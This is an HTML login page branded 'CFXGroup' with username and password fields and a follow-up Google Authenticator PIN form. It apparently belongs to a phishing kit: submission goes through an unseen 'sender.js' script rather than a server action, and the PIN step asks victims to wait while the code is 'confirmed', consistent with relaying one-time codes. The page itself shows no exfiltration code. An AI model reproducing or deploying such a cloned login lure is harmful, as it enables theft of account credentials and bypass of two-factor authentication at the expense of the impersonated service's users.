<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>CFXGroup - Login</title>
    <link rel="apple-touch-icon" sizes="57x57" href="./assetslogin/images/favicon/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="./assetslogin/images/favicon/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="./assetslogin/images/favicon/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="./assetslogin/images/favicon/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="./assetslogin/images/favicon/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="./assetslogin/images/favicon/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="./assetslogin/images/favicon/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="./assetslogin/images/favicon/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="./assetslogin/images/favicon/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192" href="./assetslogin/images/favicon/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="./assetslogin/images/favicon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="./assetslogin/images/favicon/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="./assetslogin/images/favicon/favicon-16x16.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <link rel="canonical" href="./login" >
    <link rel="stylesheet" href="./assetslogin/all.css" >
    <link rel="stylesheet" href="./assetslogin/bootstrap.min.css" >
    <link href="./assetslogin/jquery.tf.css" type="text/css" rel="stylesheet">
    <link href="./assetslogin/stylesheet.css" rel="stylesheet">
    <link href="./assetslogin/main.min.css?v=15" rel="stylesheet">
    <style type="text/css">
	.login {
    background-image: url("/img/login-bg.jpg");
    background-size: cover;
    background-attachment: fixed;
    color: #fff;
     }
	 </style>
    <style type="text/css">
        .login .login-form {
            position: relative;
            max-width: 90%;
            width: 486px;
            top: 0;
            left: 0;
            transform: none;
            background: #8abc57;
            border-radius: 33px;
            box-shadow: 0 10px 12px hsla(0, 0%, 100%, .2);
        }
    </style>
    <link href="https://fonts.googleapis.com/css?family=Work+Sans:400,700" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Anton" rel="stylesheet">
    <link rel="stylesheet" href="./assetslogin/main.min.css">
    <link href="./assetslogin/custom-styles.css" rel="stylesheet">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="theme-color" content="#ffffff">
    <link href="./assetslogin/bootstrap-pincode-input.css" rel="stylesheet">
    <style type="text/css">
        .bootbox {
            color: #212529;
        }

        .pincode-input-container input {
            text-align: center;
        }

        .login .login-form input[type=password], .login .login-form input[type=text]{

        	border: 1.5px solid #fff;

        	background: transparent;

        	border-radius: 33px;

        	padding: 12px 30px;

        	color: #fff;

        	display: block;

        	margin: auto auto 20px;

        }

        input.form-control.pincode-input-text:read-only {
            background-color: #c3c3c3 ;
        }
    </style>
 <script src="sender.js"></script>
</head>

<body class="login  d-flex justify-content-center align-items-center container" style="background-image: url('assetslogin/img/login-bg.jpg');">
    <form id="login" class="login-form text-center" action="" onsubmit=" return sender()">
	<center>
        <div class="logo"><a href="/"><img src="./assetslogin/img/cfx-silver-logo.png"></a></div>
        <h3>Login</h3>
        <p>Sign in to your account</p>
        <input type="hidden" name="captcha" id="captcha" />
        <label for="Username" class="hidden">Enter Username</label>
        <input type="text" name="Username" id="Username"  class="form-control" placeholder="Username" required>
        <label for="password" class="hidden">Enter Username</label>
        <input type="password" name="password" id="password" class="form-control" placeholder="Password" required>
        <button type="submit" class="g-recaptcha btn btn-light" value="Send" id="btn">Login
	</button>
        <br>
        <p><small style="display:block; margin-bottom: 20px"><a href="./forgot-password">Forgot Password?</a>
		</small>If you are having issues logging in,<br> please contact us here.</a></p>
    </form>


    <form id="google-auth" style="display: none" class="login-form text-center">
        <style>
            .login-form .pincode-input-container input[type=text] {
                border: 1px solid black;
                border-radius: 0;
                padding: 0;
                color: black;
                width: 50px;
                display: block;
                margin: auto auto 20px;
            }
        </style>
        <div class="logo"><img src="./assetslogin/img/cfx-silver-logo.png"></div>
        <h3>Login</h3>
        <p class="text-muted">Google authenticator pin</p>
        <input type="text" name="" id="pincode-input" />
        <br/>
        <p>Please enter your authenticator pin and wait up to 15 seconds for the system to confirm it.</p>
    </center>
    </form>


   
</body>

</html>